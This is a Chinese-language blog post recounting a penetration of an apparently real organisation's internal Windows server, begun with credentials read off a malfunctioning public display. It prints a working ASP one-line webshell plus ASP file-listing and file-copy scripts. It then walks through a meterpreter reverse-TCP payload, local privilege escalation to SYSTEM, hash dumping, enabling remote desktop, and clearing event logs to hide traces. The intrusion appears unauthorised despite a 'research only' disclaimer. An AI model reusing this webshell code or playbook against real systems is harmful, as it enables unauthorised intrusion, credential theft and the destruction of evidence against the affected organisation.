利用Metasploit和Asp木马进行某内网服务器渗透并提权实战

Linux 渗透 网络安全 Kali Metasploit
干货
发布日期:   2020-11-14

声明：本文仅供技术研究交流之用，请遵守当地相关法律法规！

声明2：本人作为一个菜鸟级脚本小子姿势水平有限，难免会出现疏漏和错误，我还得再学习一个

0x01：起因

我偶然在[数据删除]发现了一个出故障的信息发布大屏，系统是win7，正在运行一个cmd窗口，命令是登录一个地址为192.168.██.███的ftp服务器。cmd里的ftp登录指令账户和密码居然是没有加密的，于是通过此渠道获得了账户和密码，分别为gjzx和███2013

试着在自己电脑上登录了一下，成功，不过很可惜没什么有意思的东西

0x02：初步信息收集

既然偶然收集到了密码，用户名和IP地址，那下一步自然是对靶机进行信息搜集了。直接开kali上nmap

nmap扫描指定IP的所有信息：

nmap -A 192.168.██.███

nmap扫描结果：

服务器开放了445，80，21，135等端口，系统大概率可能为Windows Server 2012 R2

既然服务器开放了80端口，说明它可以用web浏览器访问，于是尝试了一下访问，结果发现需要密码和用户名，尝试了gjzx和███2013，居然成功登录。。。这个管理员属实鬼才，把两个端口的密码和用户名设成同一个。。。

这个界面展示的就是刚刚ftp服务器里的那几张图片，事情变得有意思了起来。于是右键，显示图片地址，发现图片地址为192.168.██.███/xin██████/███.jpg，不就是ftp根目录么！

0x03：获取webshell

有ftp了，有网络权限了，那肯定得用大名鼎鼎的文件上传漏洞了，先试试上传php版的一句话木马到ftp，输入地址栏，访问，结果提示我500服务器错误，看来php马被服务器过滤掉了。

再试试asp版的一句话小马，上传，进web页面访问。。。成功拿到webshell！
我用的asp一句话小马：

<!DOCTYPE html>
<html>
<body>

<%=server.createobject("wsc"+"ript.shell").exec("cmd.exe /c "&request("c")).stdout.readall%>

</body>
</html>

0x04：进阶信息收集

拿到webshell先看看进程列表
tasklist：

看了下，这个服务器并没有运行任何安全软件，管理员工资-1000

查看用户
net user：

嗯，一个gjzx（我们现在正在用的账户），一个管理员Administrator和一个被关闭的Guest

查看系统信息
systeminfo：

这个机子居然是个VMware虚拟机，管理员不用扣工资了，不过这样乐子就少了很多。系统正如nmap探测的那样是WinServer2012R2，由于我一个脚本小子对补丁名不太懂，所以还得需要更详细的信息

查看补丁信息
wmic qfe get Description,HotFixID,InstalledOn：

发现这个机子基本上只装了2015年以前的补丁，所以可以利用2015年以后新发现的漏洞来进行渗透操作

环境变量
Set：

webshell的权限很低，经过测试，这个webshell只能对C:\和D:\的根目录有完全读写执行权限，C:\Windows\只有读和运行权限，对D:\的web文件夹完全没有权限

于是再次上传一个基于vbs的asp文件目录遍历器，随后就找到了ftp文件夹所在的位置在D:\web\xin██████目录下。

asp文件遍历：

<!DOCTYPE html>
<html>
<body>
<%
dim fold_name, command_
fold_name=Request.QueryString("f")
command_=Request.QueryString("c")
Function ShowFileList(folderspec)
Dim fso, f, f1, fm, fc, fd, s, p, N, M, s1, s2, s3, p1, p2, p3
Set fso = CreateObject("scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
Set fd = f.SubFolders
N = 0
For Each f1 in fc
N = N + 1
s1 = s& f1.name 
s2 = "第 "&N&" 个："&s1&vbCrLf
s3 = s3+s2
Next
M = 0
For Each fm in fd
M = M + 1
p1 = p& fm.name 
p2 = "第 "&M&" 个："&p1&vbCrLf
p3 = p3+p2
Next
ShowFileList = "该文件夹中总共 "&N&" 个文件,"&M&"个文件夹："&vbCrLf&s3&vbcrlf&vbCrLf&p3&vbcrlf
End Function
file=ShowFileList(fold_name)
response.write(file)
%>

</body>
</html>

0x05：利用msf进行渗透并拿到meterpreter控制台

上一步中收集到的关键信息如下：

  • 网站的根目录：D:\web

  • ftp的根目录：D:\web\xin██████\

  • 系统：WinServer2012R2 64位

  • 补丁：2015年以前

  • 安全软件：无

  • 用户：gjzx，Administrator

  • webshell的可执行目录：D:,C:\

  • asp权限：较高，允许对webshell无权操作的目录进行读写操作

  • 是否可以联通攻击机：是

于是我下面的思路就是利用msfvenom生成一个meterpreter木马，上传到服务器根目录中，再利用asp马将其拷贝到webshell可执行的D:\根目录下，利用webshell执行

asp文件拷贝：

<!DOCTYPE html>
<html>
<body>

<%
Dim fso,src,dest
src=Request.QueryString("s")
dest=Request.QueryString("d")
Set fso = CreateObject("Scripting.FileSystemObject")
fso.getfile(src).copy(dest)
response.write(err.number)
%>

</body>
</html>

于是进入kali，打开msfconsole，根据靶机系统生成合适的meterpreter木马，这里我选择的是针对64位Windows的反弹TCP端口木马。由于靶机没有装任何杀软，所以不用做免杀处理，舒坦。然后上传到ftp服务器目录里，再利用asp把meterpreter木马拷到D:\下，再进入webshell执行木马，连接成功！

不过中间有个小插曲就是第一次连接发现虽然系统已经显示建立了session1但是meterpreter控制台却迟迟没弹出来，原因就是因为必须要把meterpreter的payload和本地的payload设定为同种，否则就会出现这种情况。

输入getuid发现gjzx这个账户权限并不是管理员，且getsystem也不能用，因此需要提权

0x06：利用msf提权

因为之前在我自己电脑上测试时用msf的bypassuac来提权很方便，结果在这个机子上碰了钉子

原因就是bypassuac大多数都必须需要meterpreter的用户属于管理员用户组才能提权，因此得换个思路，网上一搜发现可以利用msf的本地提权漏洞

于是控制台输入
search local/ms

因为靶机只装了15年以前的补丁，所以选择其中一个比较新的尝试了一下

成功提权到SYSTEM，并且成功将gjzx权限提到管理员级别，然后就可以随便搞事了

0x07：尝试获取其他账户hash密码和明文密码

试了下跑明文密码结果失败了，hash值倒是出来了，但必须得用字典跑

0x08：远程桌面登录

在06提权以后再
run getgui –e
开启远程桌面服务以后就可以直接进行远程桌面了，不过我又遇到了一个小插曲，就是我试图连接远程桌面时它提示我CreedSSP加密数据库修正，结果连接失败，网上搜了一下，最后根据这个教程成功以gjzx的身份进入了靶机的远程桌面

0x09：后续工作

完成以后不能被别人发现踪迹，运行
clearev
清理掉痕迹就可以收工了

0x0A：总结

别因为不方便就彻底关掉Windows更新和Windows Defender，UAC千万不要轻易关掉，勒索病毒之所以一堆单位和高校中招还不是因为安全意识不高，装完系统就关Windows Defender和Windows更新或者万年不更新补丁，病毒不勒索你才怪。还有，Windows安全性实在是太低了，如果从事的工作涉及到国家或者商业秘密的话还是用Linux当主力靠谱
